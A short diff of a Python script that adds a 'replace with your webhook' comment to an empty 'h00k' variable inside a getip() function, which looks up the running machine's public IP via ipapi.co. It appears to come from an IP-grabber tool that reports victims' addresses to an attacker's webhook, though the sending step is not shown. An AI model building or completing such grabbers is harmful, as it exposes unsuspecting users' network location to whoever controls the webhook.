@@ -14,7 +14,7 @@ header = r'''
 '''
 
 def getip():
-    h00k = ""
+    h00k = "" # replace with your webhook
     msg = requests.get("https://ipapi.co/json/")
     msg_parse = msg.json()
     ipaddr = msg_parse['ip']
